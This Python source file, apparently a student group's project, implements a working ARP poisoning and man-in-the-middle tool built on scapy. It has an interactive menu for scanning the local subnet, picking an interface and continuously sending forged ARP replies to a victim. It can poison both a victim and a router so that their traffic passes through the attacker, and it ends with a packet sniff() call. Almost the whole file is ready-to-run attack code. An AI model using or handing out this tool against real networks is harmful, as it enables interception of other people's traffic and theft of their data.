from scapy.all import *
#from scapy.all import Ether, ARP, get_if_addr, conf, sendp
import argparse
from time import sleep
import re # regex for ip validation
import sys
import traceback
import threading
import platform # to support windows and linux

"""
ARP poisoning is the act of altering the ARP table of another device on the network (for malicious purposes)

Steps to achieve ARP poisoning:
1. Choose victim machine on the same network
2. Get IP address of victim
3. Continuously send ARP packets (with arbitrary MAC-adress) using scapy to victim machine
4. Choosing the MAC-adress of the router will force the traffic, which usually goes from victim -> router, to flow from victim -> this machine

"""
# command line tool parser
parser = argparse.ArgumentParser(description="This program is an ARP poisoning tool")
args = parser.parse_args()

def print_banner():
    """
    Print some ASCII art for aesthetic purposes
    """
    banner="""
    _   ___ ___ ___ 
   /_\ | _ \ _ \ _ \\
  / _ \|   /  _/  _/
 /_/ \_\_|_\_| |_|  
                  By group 21  
    """
    print(banner)

if sys.version_info[0] >= 3:
    raw_input = input
elif sys.version_info[0] < 3:
    input = raw_input

class ARPP(object):
    def __init__(self):
        """The __init__ defines some attributes of the class helping with: 
        choice of interface, the menu options, and multi threading for arp poisoning 
        """
        self.SELECTED_INTERFACE = None
        self.TASK_DICT = {"help":parser.print_help,\
            "scan local network for users":self.get_network_users_ARPSCAN,\
            "menu":self.print_menu,\
            "arp poison":self.ARP_poison,\
            "exit":sys.exit,\
            "select interface":self.select_interface,\
            "end an ARP poisoning process": self.end_ARP,\
            "end all ARP poisoning processes":self.end_all_threads,\
            "arp mitm":self.ARP_MITM}
        self.THREADED_TASKS = []
        self.EVENTS = []
        self.system_os = platform.system() # returns either 'Windows' 'Linux' or 'Mac'
    
    def _get_my_ip(self):
        """This is a helper method for obtaining your IP adress on the selected interface.

        Returns:
            str : IP address of this machine on selected interface
        """
        my_ip = get_if_addr(self.SELECTED_INTERFACE)
        return my_ip
    
    def _get_my_mac(self):
        """This is a helper method for obtaining your mac adress on the selected interface

        Returns:
            str : MAC address of this machine on selected interface
        """
        self._assure_interface_is_selected()
        return get_if_hwaddr(self.SELECTED_INTERFACE)
            
    def _assure_interface_is_selected(self):
        """This is a helper method which helps in making sure that there is 
        an interface selected by the user before the program proceeds.
        """
        while self.SELECTED_INTERFACE is None:
            self.select_interface()
    
    def _get_mac_from_ip(self, ip):
        """This is a helper method which helps in obtaining the MAC address of a given IP address on a local network.

        Args:
            ip (str): The IP address of a machine on the network

        Returns:
            str : The MAC address associated to te given IP address
        """
        self._assure_interface_is_selected()
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        pkt = broadcast / arp_request
        answ = srp(pkt, timeout=1, verbose=False, iface=self.SELECTED_INTERFACE)[0]
        if answ.res == []:
            return None
        else:
            return answ[0][1].hwsrc

    def _represents_int(self, i):
        """This helper method helps in determining whether a given input represents an integer or not

        Args:
            i (str): some arbitrary input

        Returns:
            bool : True if i represents an integer and otherwise False
        """
        try: 
            int(i)
        except ValueError:
            return False
        else:
            return True
    
    def _is_valid_ip(self, ip):
        """This helper method helps making sure that a given IP address is a valid one, which is here programmed to 
        be True when all octets are between 0 and 255 when written in decimal.

        Args:
            ip (str): A given IP address whose validity needs to be checked

        Returns:
            bool : True if ip is a valid IP address
        """
        try:
            return [0<=int(x)<256 for x in re.split('\.',re.match(r'^\d+\.\d+\.\d+\.\d+$',ip).group(0))].count(True)==4
        except:
            return False

    def print_menu(self):
        """This method displays the options/actions to choose from
        """
        task_names = list(set(self.TASK_DICT.keys()))
        for i, task_name in enumerate(task_names, start=0):
            print("{}: {}".format(i, task_name))


    def get_ip_range(self, ip_range=None):
        if ip_range is None:
            ip_range = self._get_my_ip()+"/24"
        return ip_range

    def select_interface(self):
        if self.system_os == 'Windows':
            self.select_interface_windows()
        elif self.system_os == 'Linux':
            self.select_interface_linux()
        
    def select_interface_linux(self):
        # code breaks for Windows here
        print("Which interface would you like to use:")
        iflist = get_if_list()
        for i, _ in enumerate(iflist, start=0):
            print("{}: {}".format(i,_))
        
        answer = None
        while answer is None:
            try:
                answer = str(input("select interface>>"))
            except:
                answer = None
            
        if self._represents_int(answer):
            answer = int(answer)
            if answer>=0 and answer<len(iflist):
                self.SELECTED_INTERFACE=iflist[answer]
                print("selected {}".format(self.SELECTED_INTERFACE))
            else:
                print("[-] Interface does not exist\n")
        elif answer in iflist:
            self.SELECTED_INTERFACE = answer
        else:
            print("[-] Interface does not exist\n")
    
    def select_interface_windows(self):
        """The main issue is that for windows the selected interface has to be of type scapy.arch.windows.NetworkInterface
        and cannot be a string. Hence we need to handle the selection of the interface differently for windows.
        """
        if_list = get_windows_if_list()
        # display all interface names to user
        for i, interface_dict in enumerate(if_list,start=0):
            print("{}         {}".format(i, interface_dict['name']))
        
        # get user choice
        answer = None
        while answer is None:
            try:
                answer = str(input("select interface>>"))
            except:
                answer = None
        
        # verify that choice is valid
        if self._represents_int(answer):
            answer = int(answer)
            if answer >= 0 and answer < len(if_list):
                selected_interface_dict = if_list[answer]
                selected_interface_name = selected_interface_dict['name']
                self.SELECTED_INTERFACE = IFACES.dev_from_name( selected_interface_name )
                print("[+] selected {}".format(selected_interface_name))
                #get_windows_if_list()[4]['name']
            else:
                print("[-] Interface does not exist\n")
        else:
            print("[-] Interface does not exist\n")
        
        
    def get_network_users_ARPSCAN(self):
        """
        ARP ping scan
        """
        self._assure_interface_is_selected()
        
        ip_range = self.get_ip_range()
        request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range) #dst="ff:ff:..." means all devices on the network will receive this packet.
        print("[+] Finding devices connected to network, please wait...")
        
        print("[+] Selected Interface: {}".format(self.SELECTED_INTERFACE))
        network_devices = srp(request, timeout=10, verbose=1, iface=self.SELECTED_INTERFACE)[0] # sr is send receive command, srp for L2 packet, add 1 at the end for waiting for 1 packet only.
        for i, user in enumerate(network_devices, start=0):
            print("{}          {}".format(user[1].psrc, user[1].hwsrc))
        
        if network_devices == []:
            print("[-] No network devices found\n")
        
    def ARP_poison(self, ipVictim = "", ipToSpoof = ""):
        """
        Victim's arp table will contain the following entry
        ----------
        ...
        ipToSpoof at macAttacker
        ...
        ----------

        Args:
            ipVictim (str): IP address of the victim machine
            ipToSpoof (str): IP address that our MAC address needs to be associated with in the victim's ARP table
        """
        self._assure_interface_is_selected()
        
        while not self._is_valid_ip(ipVictim):
            try:
                ipVictim = str(input("ip of victim>>"))
            except SyntaxError:
                pass
        
        while not self._is_valid_ip(ipToSpoof):
            try:
                print("[i] The ip to spoof is the ip you want your mac address to be associated to in the victim's arp table")
                ipToSpoof = str(input("ip to spoof>>"))
            except SyntaxError:
                pass
        
        macVictim = self._get_mac_from_ip(ipVictim) # fix bug where error given if ip is not online on network
        if macVictim is None:
            print("[-] Victims MAC address could not be found, victim is possibly no longer connected to network.")
            return
        macAttacker = self._get_my_mac()
                
        
        pkt = Ether() / ARP()
        pkt[Ether].src = macAttacker
        pkt[ARP].hwsrc = macAttacker
        pkt[ARP].psrc  = ipToSpoof
        pkt[ARP].hwdst = macVictim
        pkt[ARP].pdst  = ipVictim
        
        print("[+] ARP poisoning {} -> {} started".format(ipToSpoof, ipVictim))
        e = threading.Event()
        def rec(event):
            while True:
                if event.isSet():
                    break
                sendp( pkt, iface=self.SELECTED_INTERFACE, verbose=False )
                sleep(2)
        
        T = threading.Thread(target=rec, name="ARP poisoning {} -> {}".format(ipToSpoof, ipVictim), args=(e,))
        
        self.THREADED_TASKS.append(T)
        self.EVENTS.append(e)
        self.THREADED_TASKS[-1].start()
    
    def ARP_MITM(self):
        ipVictim = ""
        ipRouter = ""
        while not self._is_valid_ip(ipVictim):
            try:
                ipVictim = str(input("ip of victim>>"))
            except SyntaxError:
                pass
        while not self._is_valid_ip(ipRouter):
            try:
                ipRouter = str(input("ip of router>>"))
            except SyntaxError:
                pass
        self.ARP_poison(ipVictim=ipVictim, ipToSpoof=ipRouter)
        self.ARP_poison(ipVictim=ipRouter, ipToSpoof=ipVictim)
        
        
    def end_ARP(self):
        print("From the following threads select the processes to terminate:")
        alive_tasks_names = {}
        for i,task in enumerate(self.THREADED_TASKS,start=0):
            alive_tasks_names[i] = task.getName()
            if task.is_alive():
                print("{}: {}".format(i, task.getName()))
        
        try:
            ttk_id = int(raw_input("Task to terminate>>"))
            self.EVENTS[ttk_id].set() # stops the thread
            del self.THREADED_TASKS[ttk_id] # remove thread from list of threads 
            del self.EVENTS[ttk_id] # remove the event corresponding to the thread also
        except:
            tb = traceback.format_exc()
            print(tb)
        
    def end_all_threads(self):
        if self.THREADED_TASKS != []:
            print("\n[+] closing threads... please wait")
            for e in self.EVENTS:
                    e.set()
            del self.EVENTS
            del self.THREADED_TASKS
            self.EVENTS = []
            self.THREADED_TASKS = []
        

    def parse_command(self, command):
        if command == "":
            pass
        elif self._represents_int(command):
            command = int(command)
            try:
                task_name = list(set(self.TASK_DICT.keys()))[command]
                task = self.TASK_DICT[task_name]
                if task == sys.exit:
                    self.end_all_threads()
                task()
            except IndexError as e:
                print("[-] Command not found\n")
                tb = traceback.format_exc()
                print(tb)
        else:
            try:
                task = self.TASK_DICT[command]
                if task == sys.exit:
                    self.end_all_threads()
                task()
            except KeyError:
                print("[-] Command not found\n")
                
                #tb = traceback.format_exc()
                #print(tb)
                

    def CLI(self):
        try:
            command = raw_input(">>") #rawrawrawsputin
            command = str(command).lower()
            self.parse_command(command=command)
        except SyntaxError:
            pass

def main():
    cl = ARPP()
    print_banner()
    cl.print_menu()
    try:
        while True:
            cl.CLI()
    except KeyboardInterrupt:
        cl.end_all_threads() #prevent memory leak when interrupting
    

if __name__=="__main__":
    main()

sniff()